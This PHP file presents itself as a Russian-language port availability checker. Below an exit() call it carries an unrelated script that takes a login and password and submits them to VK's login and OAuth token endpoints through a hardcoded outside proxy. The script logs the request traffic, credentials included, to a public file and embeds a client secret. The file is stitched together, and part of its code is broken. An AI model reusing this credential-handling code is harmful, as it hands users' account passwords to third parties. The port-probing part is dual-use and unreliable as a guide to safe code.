<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head>
 <meta content="text/html; charset=Windows-1251" http-equiv="content-type">
 <title>Port Availability Checker</title>
</head><body><div align="center">
<?php
function options_list() {
 $numargs = func_num_args();
 $arglist = func_get_args();
 $defval = $arglist[0];
 $str = '';
 for ($i=1; $i<$numargs; $i++) 
  $str.='<option value="'.$arglist[$i].'"'.($arglist[$i]==$defval?' selected':'').'>'.$arglist[$i]."\n";
 return $str;
}

$host = '';
if (!empty($_GET['host'])) $host = trim(htmlspecialchars($_GET['host']));
$port = 80;
if (!empty($_GET['port'])) $port = abs(intval(trim(htmlspecialchars($_GET['port']))));
$ms = 5;
if (!empty($_GET['ms'])) $ms = abs(intval(trim(htmlspecialchars($_GET['ms']))));

echo '<script type="text/javascript">
  var id,ms;
  function restore_name() {
   window.clearTimeout (id);
   document.f1.action.value="Проверка";
  }
  function counter(ms0) {
   if (ms0<0) ms=document.f1.ms.options[document.f1.ms.selectedIndex].value;
   document.f1.action.value=ms+"...";
   ms--;
   if (ms>-1) id = window.setTimeout ("counter(0)",1000);
   else restore_name();
  }
  function cleaner() {
   restore_name();
   document.f1.host.value="";
   document.f1.port.value="80";
  }
 </script>
 <form name="f1" method="get" action="'.userCurrentURL().'">
  <table border="0" cellpadding="4" cellspacing="0" width="40%">
   <tr>
    <td>Хост:</td>
    <td>
     <input type="text" name="host" maxlength="40" size="40" value="'.$host.'">
    </td>
   </tr>
   <tr>
    <td>Порт:</td>
    <td>
     <input type="text" name="port" maxlength="5" size="5" value="'.$port.'">     
    </td>
   </tr>
   <tr>
    <td>Таймаут, сек.:</td>
    <td><select name="ms" size="1">'.options_list($ms,3,5,10).'</select></td>
   </tr>
   <tr>
    <td>&nbsp;</td>
    <td>
     <input type="submit" name="action" value="Проверка" onclick="counter(-1)"> 
     <input type="button" value="Очистить" onclick="cleaner()"> 
    </td>
   </tr>
  </table>
 </form>';
if (!empty($_GET['action'])) {
 echo '<p>';
 if (!empty($port) and !empty($host)) {
  $connection = @fsockopen($host, $port, $errno, $errstr, $ms);
  if (is_resource($connection) and !empty($connection)) {
   $serv = @getservbyport($port,'tcp');
   echo $host.':'.$port.' '.(empty($serv)?'':'('.$serv.')').' открыт.';
   fclose($connection);
  }
  else echo $host.':'.$port.' не отвечает.</p><p>Сообщение об ошибке: "'.$errstr.'" (номер ошибки '.$errno.')';
 }
 else echo 'Задайте хост и порт';
 echo '</p>'."\n";
}
?>
</div></body></html>

<?php

	exit();

	if(isset($_POST['submit'])) {
		if(empty($_POST['email']) OR empty($_POST['pass'])) {
			$error = 'Error2';
		} else {
			if(substr($_POST['email'], 0, 1) == '+') {
				$login = mb_substr($_POST['email'], 1);
			} else {
				$login = $_POST['email'];
			}
			
			$password = $_POST['pass'];
			
			if(preg_match('/^\d+$/', $login)) {
				if(substr($_POST['email'], 0, 1) == '7') {
					$security_check_code = substr($login, 1, -2);
				}
			}
			
			$headers = Array(
				'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'content-type' => 'application/x-www-form-urlencoded',
				'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
			);
		 
			$get_main_page = post('https://vk.com', Array(
				'headers' => Array(
					'accept: '.$headers['accept'],
					'content-type: '.$headers['content-type'],
					'user-agent: '.$headers['user-agent']
				)
				));
		 
			preg_match('/name=\"ip_h\" value=\"(.*?)\"/s', $get_main_page['content'], $ip_h);
			preg_match('/name=\"lg_h\" value=\"(.*?)\"/s', $get_main_page['content'], $lg_h);
		 
			$post_auth = post('https://login.vk.com/?act=login', Array(
				'params' => 'act=login&role=al_frame&_origin='.urlencode('http://vk.com').'&ip_h='.$ip_h[1].'&lg_h='.$lg_h[1].'&email='.urlencode($login).'&pass='.urlencode($password),
				'headers' => Array(
					'accept: '.$headers['accept'],
					'content-type: '.$headers['content-type'],
					'user-agent: '.$headers['user-agent'],
				),
				'cookies' => $get_main_page['cookies']
			));
		 
			preg_match('/Location\: (.*)/u', $post_auth['headers'], $post_auth_location);
		 
			if(!preg_match('/\_\_q\_hash=/s', $post_auth_location[1])) {
				echo 'Error1';
			} else {
				echo 'Logged in';
			}
		}
	}
	
	function getUserToken($login = null, $password = null, $cookie = null) {
		global $headers;
		
		$get = post('https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$login.'&password='.$password.'&captcha_key=&captcha_sid=', Array(
			'headers' => Array(
				'accept: '.$headers['accept'],
				'content-type: '.$headers['content-type'],
				'user-agent: '.$headers['user-agent']
			),
			'cookies' => $cookies
			));
 
		return $get;
	}
	
	function getUserPage($id = null, $cookies = null) {
		global $headers;
 
		$get = post('https://vk.com/id'.$id, Array(
			'headers' => Array(
				'accept: '.$headers['accept'],
				'content-type: '.$headers['content-type'],
				'user-agent: '.$headers['user-agent']
			),
			'cookies' => $cookies
			));
 
		return $get;
	}
 
	function post($url = null, $params = null, $proxy = null, $proxy_userpwd = null) {		
		$proxy = '176.197.237.102:55950';
		#if(isset($config['proxy'])) { $proxy = $config['proxy']; }
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		$fOut = fopen($_SERVER["DOCUMENT_ROOT"].'/'.'curl_out.txt', "w" );
		curl_setopt ($ch, CURLOPT_VERBOSE, 1);
		curl_setopt ($ch, CURLOPT_STDERR, $fOut);
 
		if(isset($params['params'])) {
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $params['params']);
		}
		
		if(isset($params['headers'])) {
			curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);
		}
		
		if(isset($params['cookies'])) {
			curl_setopt($ch, CURLOPT_COOKIE, $params['cookies']);
		}
		
		if($proxy) {
			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS); 
			curl_setopt($ch, CURLOPT_PROXY, $proxy);
 
			if($proxy_userpwd) {
				curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_userpwd);
			}
		}
 
		$result = curl_exec($ch);
		$result_explode = explode("\r\n\r\n", $result);
		$headers = ((isset($result_explode[0])) ? $result_explode[0]."\r\n" : '').''.((isset($result_explode[1])) ? $result_explode[1] : '');
		$content = $result_explode[count($result_explode) - 1];
		preg_match_all('|Set-Cookie: (.*);|U', $headers, $parse_cookies);
		$cookies = implode(';', $parse_cookies[1]);
		curl_close($ch);
 
		return Array('headers' => $headers, 'cookies' => $cookies, 'content' => $content);
	}

?>

<html>
	<form method="POST">
		<input type="text" name="email" placeholder="Login" required></input>
		<input type="password" name="pass" placeholder="Password" required></input>
		<button type="submit" name="submit">Log in</button>
	</form>
</html>